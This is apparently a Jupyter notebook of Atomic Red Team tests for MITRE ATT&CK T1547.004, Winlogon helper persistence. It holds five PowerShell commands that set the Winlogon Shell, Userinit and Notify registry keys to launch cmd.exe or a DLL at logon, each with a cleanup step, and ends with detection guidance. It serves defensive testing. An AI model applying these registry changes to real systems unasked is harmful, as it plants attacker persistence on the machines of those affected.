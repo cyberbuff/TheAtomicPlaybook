{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "9878cf69",
   "metadata": {},
   "source": "# T1547.004 - Winlogon Helper DLL\nAdversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence."
  },
  {
   "cell_type": "markdown",
   "id": "bd889250",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "51f9aa5b",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Winlogon Shell Key Persistence - PowerShell",
    "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6cc6630d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.004 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "6388c032",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "65350fa5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.004 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9242dc92",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Winlogon Userinit Key Persistence - PowerShell",
    "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "27e1a713",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.004 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "a3c953a3",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e62a450",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.004 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3ebb8fc7",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Winlogon Notify Key Logon Persistence - PowerShell",
    "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.\n\nPlease note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"DllName\" \"C:\\Windows\\Temp\\atomicNotificationPackage.dll\" -Type ExpandString -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Logon\" \"AtomicTestFunction\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Impersonate\" 1 -Type DWord -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Asynchronous\" 0 -Type DWord -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b8ef6232",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.004 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "2bafa9d7",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "79849110",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.004 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d597ee94",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Winlogon HKLM Shell Key Persistence - PowerShell",
    "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b0872e87",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.004 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "4c7ba1b4",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "051740c5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.004 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "77d65683",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Winlogon HKLM Userinit Key Persistence - PowerShell",
    "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "14ea8f0b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.004 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "d0ad9c68",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dc704782",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1547.004 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "84b0a51e",
   "metadata": {},
   "source": "## Detection\nMonitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}